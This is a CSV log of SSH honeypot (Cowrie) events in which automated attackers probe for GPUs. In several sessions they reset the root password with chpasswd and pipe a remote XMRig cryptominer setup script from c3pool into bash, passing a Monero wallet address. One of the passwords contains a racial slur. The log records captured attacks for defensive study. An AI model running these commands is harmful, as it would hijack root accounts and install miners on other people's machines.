eventid,username,input,size,compCS,width,outfile,protocol,duration,height,url,keyAlgs,ttylog,data,sensor,arch,session,shasum,message,langCS,timestamp,kexAlgs,encCS,password,version,dst_port,macCS,destfile,client_fingerprint,filename
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,bed3ea657149,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:42.494729Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,cb2c82750581,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:53.238251Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,fbd969325f1a,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:55.245158Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,8d2aa7068553,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:56.417265Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,3adb35b097dc,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:57.506913Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,f6f8a3a6bb29,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:58.331621Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,c66408aba001,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:59.183600Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,30913f53e550,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:03:59.722863Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,eda4f6849c2c,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:00.621044Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,54af0b44c7c8,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:01.177613Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,51b37db35a74,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:01.918838Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,4f64a0cc2316,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:02.945640Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,88b67212018b,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:04.252752Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,ecf3d47cc9c0,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:04.819528Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,0792b3319633,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:05.676903Z,,,,,,,,,
cowrie.command.failed,,echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,2f5c9bad60e0,,Command not found: echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,2022-10-01T06:04:06.253264Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,2f5c9bad60e0,,Command not found: nvidia-smi,,2022-10-01T06:04:06.256527Z,,,,,,,,,
cowrie.command.failed,,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,,,,,,,,,,,fet-cowrie,,2f5c9bad60e0,,Command not found: curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,2022-10-01T06:04:06.260690Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,f1a8cf3a9375,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:07.536558Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,fe78ded0863a,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:08.374181Z,,,,,,,,,
cowrie.command.failed,,echo root:tempoXMRprongtogSgg31337 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,266d8142257e,,Command not found: echo root:tempoXMRprongtogSgg31337 | chpasswd | bash,,2022-10-01T06:04:08.977967Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,266d8142257e,,Command not found: nvidia-smi,,2022-10-01T06:04:08.983213Z,,,,,,,,,
cowrie.command.failed,,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,,,,,,,,,,,fet-cowrie,,266d8142257e,,Command not found: curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,2022-10-01T06:04:08.997052Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,6f8ccc0dcf54,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:10.935283Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,fc1168be6303,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:11.480984Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,c0ea093ded23,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:12.391397Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,8a918734d73b,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:12.876021Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,26c593977c96,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:17.327189Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,d5f1ab87d882,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:17.880638Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,bd5ab563ae00,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:18.754287Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,c2fc5c9bab07,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:20.257664Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,d46d9f1c9eec,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:20.792886Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,53727b46e57b,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:21.734536Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,a09fc77822a6,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:22.267375Z,,,,,,,,,
cowrie.command.failed,,echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,a5c6896d9cbf,,Command not found: echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,2022-10-01T06:04:22.831246Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,a5c6896d9cbf,,Command not found: nvidia-smi,,2022-10-01T06:04:22.833789Z,,,,,,,,,
cowrie.command.failed,,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,,,,,,,,,,,fet-cowrie,,a5c6896d9cbf,,Command not found: curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,2022-10-01T06:04:22.836088Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,a14cca1df68e,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:24.852923Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,7efd65402f29,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:25.756176Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,6bf19bdb14e3,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:26.299496Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,f20fe7d694ab,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:27.497186Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,8613681ca474,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:28.041119Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,21fe044519bd,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:28.830571Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,f06782d5c6cb,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:29.384861Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,d9378da81929,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:30.239214Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,0bef46af42bb,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:32.681456Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,5f976edf39f7,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:33.259977Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,c13f95bc0a4c,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:35.585196Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,e8001a32035d,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:36.143949Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,acba3d9d0611,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:38.093852Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,4dcaabbddc3a,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:40.764163Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,e362528165bc,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:41.314484Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,8502f08c1e33,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:43.293444Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,073e451b77ab,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:44.461685Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,1e1d30be32fc,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:45.229670Z,,,,,,,,,
cowrie.command.failed,,echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,4e30a2b006f9,,Command not found: echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,2022-10-01T06:04:46.143162Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,4e30a2b006f9,,Command not found: nvidia-smi,,2022-10-01T06:04:46.147203Z,,,,,,,,,
cowrie.command.failed,,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,,,,,,,,,,,fet-cowrie,,4e30a2b006f9,,Command not found: curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,2022-10-01T06:04:46.149830Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,e06272708855,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:47.112996Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,af5bafbab620,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:47.696704Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,0e1112abcdb2,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:49.507800Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,b28ea5e38636,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:50.120440Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,b27083b698f8,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:51.829243Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,740aff21d44b,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:52.683899Z,,,,,,,,,
cowrie.command.failed,,/ip cloud print,,,,,,,,,,,,fet-cowrie,,d2067dbb3182,,Command not found: /ip cloud print,,2022-10-01T06:04:53.259777Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,792ea16e9618,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:56.283612Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,d4b8f35bd137,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:57.011760Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,16f38bf664f8,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:04:58.259080Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,d81e92fee321,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:05:01.514307Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,7958cb0b1e8a,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:05:03.627869Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,a3bedfbd1cb9,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:05:04.799643Z,,,,,,,,,
cowrie.command.failed,,echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,9c75751459bf,,Command not found: echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,2022-10-01T06:05:07.167313Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,9c75751459bf,,Command not found: nvidia-smi,,2022-10-01T06:05:07.170177Z,,,,,,,,,
cowrie.command.failed,,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,,,,,,,,,,,fet-cowrie,,9c75751459bf,,Command not found: curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,2022-10-01T06:05:07.172660Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,fa9063a5f905,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:05:09.393146Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,0eb10e176c84,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:05:10.261985Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,7180fa3f544c,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:05:10.832826Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,087260ebd534,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:05:13.707817Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,60e60640f92e,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:05:14.766557Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,21f358f1c821,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:05:16.368871Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,307c7672da6f,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:05:17.169778Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,e23589f6230d,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:05:17.977716Z,,,,,,,,,
cowrie.command.failed,,echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,54fed3c6295f,,Command not found: echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,2022-10-01T06:05:18.569745Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,54fed3c6295f,,Command not found: nvidia-smi,,2022-10-01T06:05:18.573212Z,,,,,,,,,
cowrie.command.failed,,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,,,,,,,,,,,fet-cowrie,,54fed3c6295f,,Command not found: curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,2022-10-01T06:05:18.575747Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,3f16b8ab23ad,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:05:19.598832Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,9e7a9e2c6c25,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:05:21.414787Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,093ea41757a8,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:05:22.561422Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,3180892a2f64,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:05:24.450414Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,6716f915400c,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:05:25.053461Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,a172881f36b0,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:05:27.420124Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,bc0d94846ba5,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:05:28.176188Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,da262033fb29,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:05:29.073268Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,46a3fc9db93f,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:05:29.905892Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,5ce59f7e4b0e,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:05:30.495383Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,9e9f3051b35e,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:05:31.371626Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,a3e601e75507,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:05:32.301491Z,,,,,,,,,
cowrie.command.failed,,echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,615b3d09c8a3,,Command not found: echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,2022-10-01T06:05:34.505306Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,615b3d09c8a3,,Command not found: nvidia-smi,,2022-10-01T06:05:34.515138Z,,,,,,,,,
cowrie.command.failed,,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,,,,,,,,,,,fet-cowrie,,615b3d09c8a3,,Command not found: curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,2022-10-01T06:05:34.517577Z,,,,,,,,,
cowrie.command.failed,,lspci | grep -i --color 'vga\|3d\|2d',,,,,,,,,,,,fet-cowrie,,5cc5de431278,,Command not found: lspci | grep -i --color 'vga\|3d\|2d',,2022-10-01T06:05:35.637874Z,,,,,,,,,
